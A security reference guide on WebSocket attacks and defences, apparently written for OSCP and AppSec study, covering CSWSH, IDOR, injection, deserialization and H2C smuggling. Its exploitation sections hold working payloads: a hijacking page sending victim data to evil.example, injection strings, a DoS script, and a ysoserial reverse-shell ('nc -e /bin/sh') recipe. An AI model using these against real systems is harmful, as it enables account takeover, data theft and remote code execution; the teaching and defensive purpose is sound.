# WebSocket

> WebSocket is a full-duplex communication protocol over a single TCP connection, standardized as RFC 6455 in 2011. It is the transport of choice for real-time features: chat, notifications, live updates, collaborative editing, trading dashboards, and (increasingly) GraphQL subscriptions and streaming APIs.
>
> WebSocket security is systematically underestimated. The protocol starts as an HTTP/1.1 upgrade, which leads developers to assume it inherits HTTP security controls (Same-Origin Policy, CORS, cookie scoping, WAF coverage). It does not. Once the connection is upgraded, the browser applies no origin enforcement to individual frames, most WAFs stop inspecting, and the server must implement its own authorization for every message.
>
> This file covers WebSocket from both sides: the pentest track (detection, enumeration, exploitation) and the AppSec track (root causes, controls, verification).
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [What WebSocket Is](#1-what-websocket-is)
2. [Detection](#2-detection)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Common Variants](#5-common-variants)
6. [Exploitation Recipes](#6-exploitation-recipes)
7. [Post-Exploitation](#7-post-exploitation)
8. [Risk Context (AppSec)](#8-risk-context-appsec)
9. [Root Causes (AppSec)](#9-root-causes-appsec)
10. [Preventive Controls (AppSec)](#10-preventive-controls-appsec)
11. [Detection Controls (AppSec)](#11-detection-controls-appsec)
12. [Verification (AppSec)](#12-verification-appsec)
13. [OSCP Notes](#13-oscp-notes)
14. [Production Notes](#14-production-notes)
15. [References](#15-references)

---

## 1. What WebSocket Is

WebSocket is a stateful, bidirectional protocol on top of a single TCP connection. It is defined by RFC 6455 and maintained by the IETF. The browser API is `new WebSocket(url, protocols)`.

```text
Client                    Server
  |                         |
  |-- HTTP GET /ws ---------|
  |   Upgrade: websocket    |
  |   Connection: Upgrade   |
  |   Sec-WebSocket-Key: X  |
  |   Sec-WebSocket-Version: 13
  |                         |
  |<- 101 Switching Protocols
  |   Upgrade: websocket    |
  |   Connection: Upgrade   |
  |   Sec-WebSocket-Accept: Y
  |                         |
  |<======= full duplex ======>
  |   frames (text/binary)  |
  |                         |
```

### 1.1 Handshake

The handshake is an HTTP/1.1 request with three mandatory headers:

- `Upgrade: websocket`
- `Connection: Upgrade`
- `Sec-WebSocket-Key: <base64 16 random bytes>` - server responds with `Sec-WebSocket-Accept = base64(SHA1(key + GUID))`
- `Sec-WebSocket-Version: 13` (only valid version since RFC 6455)

The server replies with `101 Switching Protocols`. From that point on, the connection is no longer HTTP. It is a raw bidirectional byte stream with WebSocket framing.

**Critical security implication:** the handshake is a normal HTTP request, so cookie-based authentication DOES apply at upgrade time. But once upgraded, the browser will not enforce any origin checks on individual frames. A malicious page can open a WebSocket to a victim's bank, and the browser will attach the victim's cookies if the origin policy of the server allows it. This is the root of CSWSH (Cross-Site WebSocket Hijacking).

### 1.2 Frame types

- `0x1` text (UTF-8 JSON is common)
- `0x2` binary (protobuf, MessagePack, Java/PHP serialized objects)
- `0x8` close
- `0x9` ping
- `0xA` pong

Frames can be fragmented. A single logical message may span multiple frames. Tools like `wscat` and `websocat` hide this; raw frame inspection requires Burp or a custom client.

### 1.3 Subprotocols

The client can request a subprotocol via the `Sec-WebSocket-Protocol` header: `graphql-ws`, `graphql-transport-ws`, `mqtt`, `wamp`, `stomp`, `socket.io`, `sockjs`, `actioncable`. The server must pick one and echo it in the response. A server that echoes back an arbitrary subprotocol without validation is a low-severity issue but reveals weak input handling.

### 1.4 Authentication models

Four common patterns, in order of decreasing security:

1. **Token in handshake Authorization header** - requires a non-browser client or a custom `WebSocket` shim; not possible with the native browser API. Safest.
2. **Session cookie sent on upgrade** - browser sends cookies automatically. Requires strict `Origin` validation on the server, otherwise CSWSH.
3. **Token in the first frame after connect** - the server accepts the upgrade, then requires an auth message. Vulnerable if the server processes other messages before auth completes.
4. **Token in the URL query string** (`wss://target/ws?token=...`) - leaks via server logs, Referer headers (if the URL is ever pasted), browser history, and proxy access logs. Very common and very wrong.

---

## 2. Detection

WebSocket traffic is visible when:

- The URL scheme is `ws://` or `wss://` (in JS source, DevTools Network tab).
- An HTTP response contains `Upgrade: websocket` and `Connection: Upgrade`.
- `Sec-WebSocket-Key` / `Sec-WebSocket-Version` headers are present.
- DevTools -> Network -> WS filter shows a persistent connection.
- A response has status `101 Switching Protocols`.

### Quick detection

```bash
# Grep JS bundles for WebSocket URLs
curl -s "$TARGET/static/app.js" | grep -oE "(wss?://[^\"' )]+)"

# Check for WebSocket upgrade in headers
curl -sI "$TARGET/" -H "Connection: Upgrade" -H "Upgrade: websocket" | grep -iE "upgrade|sec-websocket"

# Browser DevTools: Network tab -> WS filter
```

Expected output:

```text
wss://target.htb/ws
wss://target.htb/socket.io/?EIO=4&transport=websocket
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `ws://` or `wss://` in JS | WebSocket endpoint | Connect with `wscat` |
| `101 Switching Protocols` | Upgrade succeeded | Inspect frames |
| `Sec-WebSocket-Protocol` echoed back | Subprotocol accepted | Try `graphql-ws`, `mqtt` |
| Cookie sent on upgrade | Browser auth | Test CSWSH |
| No cookie, token in query | Weak auth | Check for leaks in logs / Referer |
| Frames are JSON | Structured messages | Fuzz fields for IDOR/injection |
| Frames are binary | Serialized objects | Check for Java/PHP/Python serialization |
| Server accepts cross-origin upgrade | Missing `Origin` check | CSWSH confirmed |

---

## 3. Enumeration

### 3.1 Find endpoints

Common WebSocket paths:

```text
/ws
/websocket
/socket.io/      (Socket.IO)
/sockjs/         (SockJS)
/cable           (Rails ActionCable)
/graphql         (with subprotocol graphql-ws)
/hub             (SignalR)
/notifications
/live
/realtime
```

From JS source:

```bash
# Fetch all JS files referenced by the page, grep for WebSocket constructors
curl -s "$TARGET/" | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2 | while read js; do
  curl -s "$TARGET/$js" | grep -oE "new WebSocket\([^)]+\)" && echo "  ^ from $js"
done
```

### 3.2 Connect manually

`wscat` (Node.js):

```bash
npm install -g wscat
wscat -c "wss://target.htb/ws"

# With cookies
wscat -c "wss://target.htb/ws" -H "Cookie: session=<SESSION>"
```

`websocat` (Rust, faster, scriptable):

```bash
# Install
cargo install websocat
# Or download a static binary from the GitHub releases page

# Connect
websocat "wss://target.htb/ws"

# With custom headers
websocat -H="Cookie: session=<SESSION>" "wss://target.htb/ws"

# Send one message and exit
echo '{"action":"ping"}' | websocat -1 "wss://target.htb/ws"

# Non-TLS (labs)
websocat "ws://target.htb:8080/ws"
```

Expected output (successful connect):

```text
Connected (press CTRL+C to quit)
>
```

### 3.3 Discover the message schema

Send probe messages and observe responses:

```bash
# From a websocat session
> {"action":"help"}
< {"error":"unknown action"}
> {"type":"subscribe","channel":"public"}
< {"type":"ack","channel":"public"}
```

Look for:

- An initial server-sent message (welcome, ping, version).
- Field names in error messages (`missing field: userId`).
- Different responses for valid vs invalid JSON (reveals parser behavior).
- Binary frames with recognizable magic bytes (`AC ED` for Java serialization, `80 04` for PHP `serialize()` results in some cases, `\x82` for MessagePack maps).

### 3.4 Enumerate subprotocols

```bash
# Ask for a specific subprotocol
wscat -c "wss://target.htb/ws" -s "graphql-ws"
wscat -c "wss://target.htb/ws" -s "mqtt"
wscat -c "wss://target.htb/ws" -s "custom.v1"
```

A server that accepts every requested subprotocol is doing no validation. A server that returns `400 Bad Request` or closes the connection with code 1002 tells you it validates.

### 3.5 Check authentication

```bash
# Without cookie
wscat -c "wss://target.htb/ws"
# -> if the server accepts and responds to actions: missing auth

# With an expired cookie
wscat -c "wss://target.htb/ws" -H "Cookie: session=expired"
# -> if the server accepts: no expiry check

# With a peer user's cookie (captured from another session)
wscat -c "wss://target.htb/ws" -H "Cookie: session=<PEER_SESSION>"
# -> if messages are returned: session confusion
```

---

## 4. Attack Surface Map

| Layer | Vector | What to test |
|-------|--------|--------------|
| Handshake | Origin header | Does the server validate `Origin` on upgrade? CSWSH |
| Handshake | Cookie scope | Are cookies sent cross-origin? SameSite=Lax/Strict helps |
| Handshake | Subprotocol negotiation | Does the server echo any subprotocol? |
| Handshake | Auth token location | URL query, first frame, header? |
| Frames | Message authorization | Does the server check ownership per message? IDOR |
| Frames | Message schema | Does the server trust client-supplied types? Mass assignment |
| Frames | Injection | SQLi, NoSQL, command, XSS (if echoed back) |
| Frames | Deserialization | Binary frames with serialized objects |
| Frames | Size limits | Oversized frame -> DoS |
| Frames | Rate limits | Message flood -> DoS, business logic abuse |
| Transport | TLS | `ws://` vs `wss://`; mixed-content bypass |
| Cross-protocol | H2C smuggling | WebSocket upgrade smuggled via HTTP/2 cleartext |

---

## 5. Common Variants

### 5.1 CSWSH (Cross-Site WebSocket Hijacking)

The browser sends cookies automatically on the WebSocket upgrade. If the server does not validate the `Origin` header, an attacker-controlled page can open a WebSocket to the victim's account and read/write messages on their behalf. No CORS preflight is involved; the browser does not enforce Same-Origin Policy on frames.

```html
<!-- Attacker page hosted at https://evil.example -->
<script>
  const ws = new WebSocket("wss://victim.example/ws");
  ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
  ws.onmessage = (e) => fetch("https://evil.example/collect", {method:"POST", body:e.data});
</script>
```

**CWE-346:** Origin Validation Error. **OWASP 2021:** A01 Broken Access Control, A07 Identification and Authentication Failures.

### 5.2 Missing authentication

Some servers accept the WebSocket upgrade unconditionally and never require a session or a token. Anyone on the network can connect and interact.

```bash
wscat -c "ws://target.htb:8080/ws"
> {"action":"listUsers"}
< {"users":[...]}
```

**CWE-306:** Missing Authentication for Critical Function. **OWASP 2021:** A07.

### 5.3 Authentication bypass

The server accepts the upgrade without auth, expects the first frame to carry a token, but processes messages before the token is validated. Send the sensitive action as the first frame.

```bash
# Intended: {"action":"auth","token":"<TOKEN>"} then other actions
# Bypass: send the privileged action first
wscat -c "wss://target.htb/ws"
> {"action":"adminPanel"}
< {"panel":[...]}
```

**CWE-696:** Incorrect Behavior Order. **OWASP 2021:** A07.

### 5.4 IDOR in WebSocket messages

The handshake authenticates the user, but individual messages do not verify that the user owns the requested object. Same class as REST BOLA, but on WS.

```bash
> {"action":"getMessages","chatId":"1001"}      # own chat
< {"messages":[...]}
> {"action":"getMessages","chatId":"1002"}      # peer chat
< {"messages":[...]}                             # leaked
```

**CWE-639:** Authorization Bypass Through User-Controlled Key. **OWASP 2021:** A01.

### 5.5 Message injection

Frames carrying user input are passed to a backend query, shell command, or HTML sink without sanitization. The transport is different; the injection is not.

```text
# SQLi via a "search" action
> {"action":"search","q":"' OR 1=1 -- -"}

# Command injection via a "ping" action
> {"action":"ping","host":"127.0.0.1; id"}

# XSS if the server echoes the message into a page rendered by another user
> {"action":"chat","text":"<img src=x onerror=alert(1)>"}
```

**CWE-89 / CWE-77 / CWE-79.** **OWASP 2021:** A03 Injection.

### 5.6 DoS via large frames

No per-frame size limit and no message rate limit. A single client can exhaust server memory or saturate the event loop.

```bash
# [PROD-RISK] Send a 10 MB JSON message
python3 - <<'PY'
import asyncio, websockets
async def main():
    async with websockets.connect("wss://target.htb/ws") as ws:
        await ws.send("A" * (10 * 1024 * 1024))
asyncio.run(main())
PY
```

**CWE-770:** Allocation of Resources Without Limits. **OWASP 2021:** A05 Security Misconfiguration (unbounded resource consumption).

### 5.7 Binary deserialization (RCE)

Binary frames carrying serialized objects (Java, PHP, Python pickle, .NET BinaryFormatter) are dangerous if the server deserializes attacker-controlled bytes without a type allowlist. Same class as unsafe deserialization in HTTP bodies, but on WS.

```text
# Java serialization magic bytes
AC ED 00 05

# Python pickle magic
80 04 95 ... .  (varies)

# .NET BinaryFormatter
00 01 00 00 00 FF FF FF FF
```

For a Java target, `ysoserial` payloads can be sent over WS if the server deserializes frames with `ObjectInputStream`. Test in a lab only.

**CWE-502:** Deserialization of Untrusted Data. **OWASP 2021:** A08 Software and Data Integrity Failures.

### 5.8 Cross-protocol request smuggling (H2C)

If the front-end proxies HTTP/2 cleartext (h2c) and the back-end accepts WebSocket upgrades, an attacker can smuggle a WebSocket upgrade inside an h2c request and bypass the proxy's routing, auth, or logging. Known as "H2C smuggling" and documented by Bishop Fox. Modern proxies and CDNs are often vulnerable if h2c is enabled on the origin.

**CWE-444:** Inconsistent Interpretation of HTTP Requests. **OWASP 2021:** A03, A05.

### 5.9 Token in URL leakage

Auth token passed in the query string (`wss://target/ws?token=...`) leaks in:

- Server access logs (reverse proxy, load balancer, CDN).
- Browser history.
- Referer header if the WS URL is ever embedded in a link.
- Corporate proxy logs.

Even if the WS traffic itself is TLS, the upgrade request URL is often logged in cleartext on the server side.

**CWE-598:** Use of GET Request Method With Sensitive Query Strings. **OWASP 2021:** A02 Cryptographic Failures, A09 Security Logging Failures.

---

## 6. Exploitation Recipes

### 6.1 CSWSH to account takeover

1. Confirm the server does not validate `Origin`:

```bash
wscat -c "wss://victim.htb/ws" -H "Origin: https://evil.example"
# If the connection is accepted: CSWSH is possible
```

2. Identify a privileged action the victim can perform (change email, read messages, export data).
3. Host the PoC on an attacker-controlled domain:

```html
<script>
  const ws = new WebSocket("wss://victim.htb/ws");
  ws.onopen = () => ws.send(JSON.stringify({action:"changeEmail", email:"attacker@evil.example"}));
</script>
```

4. Lure the victim to the page. The victim's cookies are sent automatically. Email changes to the attacker's address.
5. Trigger a password reset on the victim account. Take over.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.2 IDOR in messages to privilege escalation

1. Enumerate message actions. Find one that returns user data by ID.

```bash
> {"action":"getUser","userId":"<SELF_ID>"}
< {"user":{"id":"<SELF_ID>","role":"user"}}
```

2. Change `userId` to a peer's ID or to `1` (often admin).

```bash
> {"action":"getUser","userId":"1"}
< {"user":{"id":"1","role":"admin"}}
```

3. Look for an update action (`setRole`, `updateUser`) that accepts `userId`.

```bash
> {"action":"updateUser","userId":"<SELF_ID>","role":"admin"}
< {"ok":true}
```

4. Reconnect (or refresh) and verify the new role.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.3 Missing auth to full data exfiltration

1. Connect without any cookie or token.
2. If the connection is accepted, enumerate actions.

```bash
wscat -c "ws://target.htb:8080/ws"
> {"action":"help"}
< {"actions":["getProfile","listUsers","exportData"]}
> {"action":"exportData"}
< {"csv":"...all users..."}
```

### 6.4 Deserialization to RCE

1. Confirm binary frames are accepted and the server deserializes them.

```bash
# Send the Java serialization magic followed by junk
printf '\xac\xed\x00\x05\x00\x00' | websocat --binary "wss://target.htb/ws"
# If the server returns a stack trace mentioning ObjectInputStream: vulnerable
```

2. Generate a payload with `ysoserial` (lab only):

```bash
java -jar ysoserial.jar CommonsCollections5 'nc -e /bin/sh 10.10.14.5 4444' > payload.bin
cat payload.bin | websocat --binary "wss://target.htb/ws"
```

3. Catch the shell:

```bash
nc -lvnp 4444
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 7. Post-Exploitation

Once a WebSocket channel is compromised, the practical value is:

- **Live data feed.** Subscribe to privileged channels; observe admin actions in real time.
- **Session riding.** The victim's session is active; you can perform actions on their behalf without knowing their password.
- **Pivot.** If the WS server bridges to internal services (message bus, database, orchestrator), the actions available via WS may reach further than the HTTP API.
- **Persistence.** A subscription to a channel can stay open for a long time; useful for monitoring changes.
- **Exfiltration channel.** Some egress filters allow `wss://` while blocking HTTP POST to unknown hosts.

For the report: what messages did you see, what actions did you perform as the victim, what data was reachable.

---

## 8. Risk Context (AppSec)

WebSocket vulnerabilities map to the OWASP Top 10:2021 as follows:

| OWASP 2021 | WebSocket-specific manifestation |
|------------|----------------------------------|
| A01 Broken Access Control | CSWSH, IDOR in messages, missing per-message authorization |
| A02 Cryptographic Failures | `ws://` in production, token in URL query |
| A03 Injection | SQLi / NoSQLi / command injection / XSS via frame content |
| A05 Security Misconfiguration | Unbounded frame size, no rate limit, missing `Origin` check |
| A07 Identification and Authentication Failures | Missing auth on upgrade, auth-before-action ordering bug |
| A08 Software and Data Integrity Failures | Binary deserialization of untrusted frames |
| A09 Security Logging and Monitoring Failures | WS frames not logged, no anomaly detection |

---

## 9. Root Causes (AppSec)

The recurring root causes, in order of frequency:

1. **The "HTTP inheritance" assumption.** Developers assume the WebSocket inherits HTTP security controls: Same-Origin Policy, CORS, cookie scoping, WAF inspection, rate limiting. None of these apply to individual frames. This is the single biggest cause of WS-specific vulnerabilities.
2. **Handshake-only authentication.** Auth is checked once at upgrade, then never again. Every message should re-verify authorization for the specific action it performs.
3. **No Origin validation.** The `Origin` header is present on the handshake and easy to validate. Servers frequently skip this and rely on cookies alone.
4. **Schema-less messages.** JSON messages are parsed into a hashmap and passed to the backend without type or field validation. Mass assignment, IDOR, and injection follow.
5. **No size or rate limits.** The upgrade is accepted, and the server processes whatever comes next without bounds.
6. **Unsafe deserialization.** Binary frames are deserialized with default libraries that accept arbitrary types.

---

## 10. Preventive Controls (AppSec)

**Handshake layer:**

- **Validate `Origin`** against an allowlist of the application's own origins. Reject everything else with `403` before the upgrade completes. This is the single most important control against CSWSH.
- **Require authentication at upgrade time.** Reject unauthenticated upgrades with `401` and a `WWW-Authenticate` header.
- **Send cookies with `SameSite=Lax` or `Strict`** so that cross-site WebSocket upgrades do not carry the session cookie. This is a defense-in-depth layer, not a replacement for `Origin` validation.
- **Never put tokens in the URL query string.** Use the `Authorization` header (custom clients) or a first-frame token with strict ordering (browser clients).

**Frame layer:**

- **Authorize every message.** The server must check that the authenticated user owns the object referenced in the message, and that the user is allowed to perform the requested action. This is the WS equivalent of per-endpoint authorization on HTTP.
- **Validate the message schema.** Use a strict schema (JSON Schema, Protobuf, Avro, or a hand-written validator). Reject unknown fields, wrong types, and out-of-range values. This blocks mass assignment and many injection classes.
- **Sanitize before use.** Frame content that reaches a database, shell, or HTML sink must go through the same input handling as HTTP request bodies. No exceptions for "trusted" clients.
- **Enforce size limits per frame and per message.** Reject oversized frames with close code `1009` (Message Too Big).
- **Enforce rate limits per connection, per user, and per action.** Reject with a close code or a rate-limit error message.
- **Disallow binary frames if the application does not use them.** If the app is text-only, close the connection on binary frames. This eliminates the deserialization class entirely.
- **Allowlist subprotocols.** Echo back only subprotocols the server actually implements.

**Transport layer:**

- **`wss://` only in production.** Redirect `ws://` to `wss://` at the load balancer, or reject it outright.
- **No h2c on the origin.** If the origin accepts HTTP/2 cleartext, disable it. H2C smuggling depends on it.

---

## 11. Detection Controls (AppSec)

Signals worth monitoring and alerting on:

- **Cross-origin upgrade attempts.** Log the `Origin` header on every upgrade; alert on origins that are not on the allowlist. A spike in rejected upgrades is a strong signal of an active CSWSH attempt.
- **Unauthenticated upgrade attempts.** Alert on upgrades that arrive without a session cookie when the application expects one.
- **Per-connection frame rate.** Alert on connections exceeding a threshold of frames per second or messages per minute.
- **Oversized frames.** Alert on frames above the configured maximum size.
- **Unknown subprotocol requests.** A sudden interest in `graphql-ws` on a non-GraphQL endpoint is reconnaissance.
- **Binary frames on text-only endpoints.** Almost always malicious or a broken client.
- **Message content matching injection signatures.** The same WAF rules that apply to HTTP bodies should apply to frame payloads. Most WAFs do not inspect frames by default; enable it or route frames through a sidecar inspector.
- **Long-lived connections from a single origin.** Useful baseline: how many concurrent WS connections does a normal user open?

---

## 12. Verification (AppSec)

Concrete checks a reviewer or pentester can run to verify each control:

| Control | Verification |
|---------|--------------|
| Origin validation | Send an upgrade with `Origin: https://evil.example`. Expect `403` before upgrade completes. |
| Auth on upgrade | Send an upgrade with no cookie. Expect `401` + `WWW-Authenticate`. |
| Per-message authorization | Connect as user A, send a message referencing user B's object. Expect `403` on the message. |
| Schema validation | Send a message with an extra field (`{"action":"getUser","id":"<SELF>","role":"admin"}`). Expect a schema error, not a silent role update. |
| Size limit | Send a frame exceeding the configured limit. Expect close code `1009`. |
| Rate limit | Send N+1 messages in the configured window. Expect a rate-limit error or close. |
| No binary frames | Send a binary frame. Expect close code `1003` (Unsupported Data). |
| Subprotocol allowlist | Request `Sec-WebSocket-Protocol: made-up`. Expect the server to not echo it or to reject the upgrade. |
| TLS only | Attempt `ws://` (non-TLS) against the production host. Expect a redirect or a hard failure. |
| Cookie SameSite | Inspect `Set-Cookie` on login. `SameSite=Lax` or `Strict` for the session cookie. |

Cross-reference: OWASP ASVS 4.0 V4 (Access Control), V5 (Validation), V13 (API and Web Service), V14 (Configuration). OWASP API Security Top 10:2023 API1 (BOLA), API2 (Broken Authentication), API4 (Unrestricted Resource Consumption).

---

## 13. OSCP Notes

For OSCP, WebSocket rarely appears as a standalone box, but it shows up inside web applications:

- **Detection:** open DevTools -> Network -> WS filter on the target application. Any persistent connection is a candidate.
- **Test the handshake:** connect with `wscat` from your Kali host. Try without a cookie. If it accepts, you have unauthenticated access.
- **Test CSWSH only if the app is cookie-based and the `Origin` header is not validated.** A quick check: connect with `-H "Origin: https://evil.example"` and see if the server accepts.
- **Fuzz the message schema.** Send malformed JSON, extra fields, wrong types. Error messages often reveal field names and validation logic.
- **Look for IDOR in messages.** Change `userId`, `chatId`, `orderId` to neighbors.
- **Do not skip WS because it looks small.** It is a full application surface with its own auth and authorization bugs.
- **If you find binary frames, hexdump them.** Magic bytes `AC ED` -> Java, `80 04` -> Python pickle, `00 01 00 00 00 FF FF FF FF` -> .NET BinaryFormatter.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 14. Production Notes

Safe and unsafe practices:

| Practice | Verdict |
|----------|---------|
| `wss://` with a valid certificate | Required |
| Origin allowlist on upgrade | Required |
| Auth at upgrade + per-message authorization | Required |
| Schema validation on every message | Required |
| Frame size limit + rate limit | Required |
| No tokens in URL query | Required |
| SameSite=Lax/Strict on session cookie | Recommended |
| Disable binary frames if unused | Recommended |
| Disable h2c on origin | Recommended |
| WAF inspection of frames | Recommended (off by default in most WAFs) |
| Per-connection anomaly monitoring | Recommended |
| `ws://` anywhere in production | Never |

---

## 15. References

- RFC 6455 - The WebSocket Protocol: https://datatracker.ietf.org/doc/html/rfc6455
- OWASP Web Security Testing Guide - Testing WebSockets: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
- OWASP Top 10:2021: https://owasp.org/Top10/
- OWASP API Security Top 10:2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP ASVS 4.0: https://owasp.org/www-project-application-security-verification-standard/
- PortSwigger Web Security Academy - WebSocket labs: https://portswigger.net/web-security/websockets
- Bishop Fox - H2C Smuggling: https://bishopfox.com/blog/h2c-smuggling-request
- CWE-346 Origin Validation Error: https://cwe.mitre.org/data/definitions/346.html
- CWE-306 Missing Authentication for Critical Function: https://cwe.mitre.org/data/definitions/306.html
- CWE-639 Authorization Bypass Through User-Controlled Key: https://cwe.mitre.org/data/definitions/639.html
- CWE-502 Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- CWE-770 Allocation of Resources Without Limits: https://cwe.mitre.org/data/definitions/770.html
- CWE-444 Inconsistent Interpretation of HTTP Requests: https://cwe.mitre.org/data/definitions/444.html
- CWE-598 Use of GET Request Method With Sensitive Query Strings: https://cwe.mitre.org/data/definitions/598.html